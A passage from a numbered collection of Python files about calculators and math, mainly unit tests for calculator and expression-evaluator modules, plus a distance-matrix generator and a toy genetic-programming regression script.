2)\n\n        ans = calc.execute('3.5 ** 1.1')\n        self.assertEqual(float(ans), 3.5 ** 1.1)\n\n        ans = calc.execute('3 << 2')\n        self.assertEqual(int(ans), 3 << 2)\n\n        ans = calc.execute('3.5 >> 1.1')\n        self.assertEqual(int(ans), 3 >> 1)\n\n        ans = calc.execute('3 >> 2')\n        self.assertEqual(int(ans), 3 >> 2)\n\n        ans = calc.execute('3.5 | 1.1')\n        self.assertEqual(int(ans), 3 | 1)\n\n        ans = calc.execute('3 & 2')\n        self.assertEqual(int(ans), 3 & 2)\n\n        ans = calc.execute('3.5 & 1.1')\n        self.assertEqual(int(ans), 3 & 1)\n\n        ans = calc.execute('3 ^ 2')\n        self.assertEqual(int(ans), 3 ^ 2)\n\n    def test_unaryop(self):\n        calc = swisscalc.Calc()\n\n        ans = calc.execute('8!')\n        self.assertEqual(int(ans),  math.factorial(8))\n\n        ans = calc.execute('8.23!')\n        self.assertEqual(int(ans), math.factorial(8))\n\n        ans = calc.execute('-8')\n        self.assertEqual(int(ans), -8)\n\n        ans = calc.execute('-8.3')\n        self.assertEqual(float(ans), -8.3)\n\n        ans = calc.execute('~8')\n        self.assertEqual(int(ans), ~8)\n\n    def test_assign(self):\n        calc = swisscalc.Calc()\n\n        calc.execute('v = 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3)\n\n        calc.execute('v = 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v += 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 + 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v += 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 + 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v -= 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 - 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v -= 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 - 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v *= 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 * 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v *= 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 * 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v /= 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 / 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v /= 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 / 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v %= 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 % 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v %= 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 % 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v **= 3')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3 ** 3)\n\n        calc.execute('v = 3.8')\n        calc.execute('v **= 3.8')\n        ans = calc.execute('v')\n        self.assertEqual(float(ans), 3.8 ** 3.8)\n\n        calc.execute('v = 3')\n        calc.execute('v <<= 3')\n        ans = calc.execute('v')\n        self.assertEqual(int(ans), 3 << 3)\n\n        calc.execute('v = 3')\n        calc.execute('v >>= 3')\n        ans = calc.execute('v')\n        self.assertEqual(int(ans), 3 >> 3)\n\n        calc.execute('v = 3')\n        calc.execute('v &= 3')\n        ans = calc.execute('v')\n        self.assertEqual(int(ans), 3 & 3)\n\n        calc.execute('v = 3')\n        calc.execute('v |= 3')\n        ans = calc.execute('v')\n        self.assertEqual(int(ans), 3 | 3)\n\n        calc.execute('v = 3')\n        calc.execute('v ^= 3')\n        ans = calc.execute('v')\n        self.assertEqual(int(ans), 3 ^ 3)\n\n    def test_func(self):\n        calc = swisscalc.Calc()\n\n        ans = calc.execute('log(2 ** 8, 2)')\n        self.assertEqual(float(ans), math.log(2 ** 8, 2))\n\nclass InterfaceTest(unittest.TestCase):\n    def test_names(self):\n        calc = swisscalc.Calc()\n\n        ans = calc.execute('pi')\n        self.assertEqual(float(ans), math.pi)\n\n        ans = calc.execute('e')\n        self.assertEqual(float(ans), math.e)\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "504": "# \u5f00\u53d1\u4eba\u5458\uff1a \u66fe\u7965\u8302\n# \u65e5\u671f\uff1a 2021/03/31\nimport pytest\nimport yaml\nfrom Tools.demo.sortvisu import steps\n\nfrom pythoncode.calculator import Calculator\n\n\n# \u89e3\u6790\u6d4b\u8bd5\u6570\u636e\u6587\u4ef6\ndef get_datas():\n    with open(\"./datas/calc.yml\") as f:\n        datas = yaml.safe_load(f)\n    add_datas = datas['add']['datas']\n    add_ids = datas['add']['ids']\n    print(add_datas)\n    print(add_ids)\n    return [add_datas, add_ids]\n\n\n# \u89e3\u6790\u6d4b\u8bd5\u6b65\u9aa4\u6587\u4ef6\ndef setup(addsetupfile, calc, a, b, expect):\n    with open(addsetupfile) as f:\n        setup = yaml.safe_load(f)\n\n    for step in setup:\n        if 'add' == step:\n            print(\"step: add\")\n            result = calc.add(a, b)\n        elif 'add1' == step:\n            print(\"step: add1\")\n            result = calc.add1(a, b)\n\n        assert expect == result\n\n\n# def test_a():\n#     print(\"test case a\")\n\n\nclass TestCalc:\n    def setup_class(self):\n        print(\"\u8ba1\u7b97\u5f00\u59cb\")\n        self.calc = Calculator()\n\n    def teardown_class(self):\n        print(\"\u8ba1\u7b97\u7ed3\u675f\")\n\n    # def setup(self):\n    #     self.calc = Calculator()\n\n    @pytest.mark.parametrize('a,b,expect', get_datas()[0], ids=get_datas()[1])\n    def test_add(self, a, b, expect):\n        # calc = Calculator()\n        result = self.calc.add(a, b)\n        assert result == expect\n\n    @pytest.mark.parametrize('a,b,expect', [\n        [0.1, 0.1, 0.2], [0.1, 0.2, 0.3]\n    ])\n    def test_add_float(self, a, b, expect):\n        result = self.calc.add(a, b)\n        assert round(result, 2) == expect\n\n    # def test_add1(self):\n    #   #  calc = Calculator()\n    #     result = self.calc.add (100,100)\n    #     assert result == 200\n    #\n    # def test_add2(self):\n    #   #  calc = Calculator()\n    #     result = self.calc.add (0.1,0.1)\n    #     assert result == 0.2\n\n\nclass TestCalc1:\n    def setup_class(self):\n        print(\"\u8ba1\u7b97\u5f00\u59cb\")\n        self.calc = Calculator()\n\n    def teardown_class(self):\n        print(\"\u8ba1\u7b97\u7ed3\u675f\")\n\n    @pytest.mark.parametrize('a,b,expect', [\n        [1, 1, 1], [0, 1, 0], [10, 1, 10], [-10, 1, -10], [10, -1, -10],\n        [-10, -1, 10], [1, 2, 0.5], [1, 3, 0.3333333333333333], [1, 100, 0.01], [0.1, 0.1, 1],\n        [0.1, 1, 0.1], [0.1, 0.001, 100]\n    ], ids=['float1_case', 'float2_case', 'float3_case', 'float4_case',\n            'float5_case', 'float6_case', 'float7_case'])\n    def test_div(self, a, b, expect):\n        # calc = Calculator()\n        result = self.calc.div(a, b)\n        assert result == expect\n\n    @pytest.mark.parametrize('a,b', [\n        [0.1, 0], [10, 0]\n    ])\n    def test_div(self, a, b):\n        with pytest.raises(ZeroDivisionError):  # \u8865\u8d27\u5f02\u5e38\u573a\u666f\n            self.calc.div(a, b)\n\n    # def test_div(self):\n    #     with pytest.raises(ZeroDivisionError) :   #\u8865\u8d27\u5f02\u5e38\u573a\u666f\n    #         result = self.calc.div(1,0)\n\n    # try:\n    #     result = self.calc.div(1,0)\n    # except ZeroDivisionError :\n    #     print(\"\u9519\u8bef\")\n\n    def test_add_setup(self):\n        a = 1\n        b = 1\n        expect = 2\n        setup(\"./setup/add_setup.yml\", self.calc, a, b, expect)\n        # assert 2 ==self.calc.add(1,1)\n        # assert 3 == self.calc.add1(1, 2)\n        # assert 0 == self.calc.add(-1, 1)\n", "505": "import os\nfrom CalcDistances import CalcDistances\nfrom GenerateTables import GenerateTables\nfrom SaveToFile import SaveToFile\n\n\nclass GenerateDistance:\n    def __init__(self, tableGenerator: GenerateTables) -> None:\n        self.ListOfTfmCells = []\n        self.saveF = SaveToFile(os.path.abspath(os.getcwd()))\n        self.TableGenerator: GenerateTables = tableGenerator\n\n    def GenerateEuclidesDistance(self, ListOfTfmCellsData, printTable = True):\n        calcObject = CalcDistances()\n        iterator = 0\n        biggerOutputList = []\n        for i in ListOfTfmCellsData:\n            outputList = []\n            for k in ListOfTfmCellsData:\n                outputList.append(calcObject.CalcEuclides(i, k))\n            iterator += 1\n            biggerOutputList.append(outputList) \n        if printTable:  \n            self.TableGenerator.TextTable(biggerOutputList, \"Euclides.txt\")\n        return biggerOutputList\n\n    def GenerateCosineDistance(self, ListOfTfmCellsData, printTable = True):\n        calcObject = CalcDistances()\n        iterator = 0\n        biggerOutputList = []\n        for i in ListOfTfmCellsData:\n            outputList = []\n            for k in ListOfTfmCellsData:\n                outputList.append(calcObject.CalcCosine(i, k))\n            iterator += 1\n            biggerOutputList.append(outputList) \n        if printTable:\n            self.TableGenerator.TextTable(biggerOutputList, \"Cosine.txt\")\n        return biggerOutputList\n\n    def GenerateChebysheveDistance(self, ListOfTfmCellsData, printTable = True):\n        calcObject = CalcDistances()\n        iterator = 0\n        biggerOutputList = []\n        for i in ListOfTfmCellsData:\n            outputList = []\n            for k in ListOfTfmCellsData:\n                outputList.append(calcObject.CalcChebyshev(i, k))\n            iterator += 1\n            biggerOutputList.append(outputList) \n        if printTable:  \n            self.TableGenerator.TextTable(biggerOutputList, \"Chebyshev.txt\")\n        return biggerOutputList\n\n    def GenerateManhatanDistance(self, ListOfTfmCellsData,  printTable = True):\n        calcObject = CalcDistances()\n        iterator = 0\n        biggerOutputList = []\n        for i in ListOfTfmCellsData:\n            outputList = []\n            for k in ListOfTfmCellsData:\n                outputList.append(calcObject.CalcManhatan(i, k))\n            iterator += 1\n            biggerOutputList.append(outputList)\n        if printTable:  \n            self.TableGenerator.TextTable(biggerOutputList, \"Manhatan.txt\")\n        return biggerOutputList\n\n    def GeneratePowDistance(self,ListOfTfmCellsData,  p: int, r: int):\n        calcObject = CalcDistances()\n        iterator = 0\n        biggerOutputList = []\n        for i in ListOfTfmCellsData:\n            outputList = []\n            for k in ListOfTfmCellsData:\n                outputList.append(calcObject.CaclPowDistance(i, k, p, r))\n            iterator += 1\n            biggerOutputList.append(outputList) \n        self.TableGenerator.TextTable(biggerOutputList, \"Pow{}{}.txt\".format(p, r))\n        return biggerOutputList", "506": "from random import random\nfrom math import floor\nimport math\nimport random\nimport copy\nimport netCDF4\nfrom sklearn.datasets import load_boston\n\n\n\n\nclass calcNode():\n    def __init__(self, input_dim, calc='~', permute_rate=0.5, input_rate=0.5):\n        self.calc = calc\n        self.left = 0\n        self.right = 0\n        self.mid = 0\n        self.permute_rate = permute_rate\n        self.permute_list = ['+', '-', '*', '/', '~', '@', 'sin', 'cos', 'tan']\n        self.input_dim = input_dim\n        self.input_rate = input_rate\n\n\n    def permute(self):\n        if random.random() < self.permute_rate:\n            permute_idx = floor(random.random() * len(self.permute_list))\n            self.calc = self.permute_list[permute_idx]\n            self.left = {\n                '+': calcNode(self.input_dim),\n                '-': calcNode(self.input_dim),\n                '*': calcNode(self.input_dim),\n                '/': calcNode(self.input_dim),\n                '~': 0,\n                '@': 0,\n                'sin': calcNode(self.input_dim),\n                'cos': calcNode(self.input_dim),\n                'tan': calcNode(self.input_dim),\n            }.get(self.calc)\n            self.right = {\n                '+': calcNode(self.input_dim),\n                '-': calcNode(self.input_dim),\n                '*': calcNode(self.input_dim),\n                '/': calcNode(self.input_dim),\n                '~': 0,\n                '@': 0,\n                'sin': 0,\n                'cos': 0,\n                'tan': 0,\n            }.get(self.calc)\n            self.mid = {\n                '+': 0,\n                '-': 0,\n                '*': 0,\n                '/': 0,\n                '~': (random.random() - 0.5) * 10,\n                '@': random.randrange(0, self.input_dim),\n                'sin': 0,\n                'cos': 0,\n                'tan': 0,\n            }.get(self.calc)\n            if isinstance(self.left, calcNode):\n                self.left.permute()\n            if isinstance(self.right, calcNode):\n                self.right.permute()\n        else:\n            return\n\n\n\n    def value(self, input_):  # input_ is a list []\n        if self.calc == '+':\n            return self.left.value(input_) + self.right.value(input_)\n        if self.calc == '-':\n            return self.left.value(input_) - self.right.value(input_)\n        if self.calc == '*':\n            return self.left.value(input_) * self.right.value(input_)\n        if self.calc == '/':\n            return self.left.value(input_) * self.right.value(input_)\n        if self.calc == '~':\n            return self.mid\n        if self.calc == '@':\n            return input_[self.mid]\n        if self.calc == 'sin':\n            return math.sin(self.left.value(input_))\n        if self.calc == 'cos':\n            return math.cos(self.left.value(input_))\n        if self.calc == 'tan':\n            return math.tan(self.left.value(input_))\n\n        return 0\n\n    def diff(self, input, label):\n        return math.pow(self.value(input) - label, 2)\n\n    def print_(self):\n        print('(', end=' ')\n        if self.calc not in ['~', '@'] :\n            self.left.print_()\n        print(self.calc, end=' ')\n        if self.calc in ['~', '@'] :\n            print(self.mid, end=' ')\n        if self.calc in ['+', '-', '*', '/']:\n            self.right.print_()\n        print(')', end=' ')\n\n\n\n\n\n\n\n\nif __name__ == '__main__':\n\n    epochs = 1000000\n\n    boston = load_boston()\n    print(boston.data.shape)\n\n    data = boston.data\n    target = boston.target\n\n    gene1 = calcNode(data.shape[1])\n    gene2 = calcNode(data.shape[1])\n\n\n\n    for epoch in range(epochs):\n        print('-------------------------')\n        gene1.permute()\n        print('gene1_structure:')\n        gene1.print_()\n        print('gene2_structure:')\n        gene2.print_()\n        diff_sum_1 = 0\n        diff_sum_2 = 0\n\n        for i in range(data.shape[0]):\n            data_ = data[i]\n            target_ = target[i]\n            dif1 = gene1.diff(data_, target_)\n            dif2 = gene2.diff(data_, target_)\n            diff_sum_1 += dif1\n            diff_sum_2 += dif2\n\n        print('\\nepoch: {}/{} \\n diff_sum_1: {}\\n diff_sum_2: {}'.format(epoch, epochs, diff_sum_1/data.shape[0], diff_sum_2/data.shape[0]))\n        if diff_sum_1 < diff_sum_2:\n            gene2 = copy.deepcopy(gene1)\n        else:\n            gene1 = copy.deepcopy(gene2)\n\n        print('-------------------------')\n\n\n\n\n", "507": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # Typical room temperature (Kelvin)\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            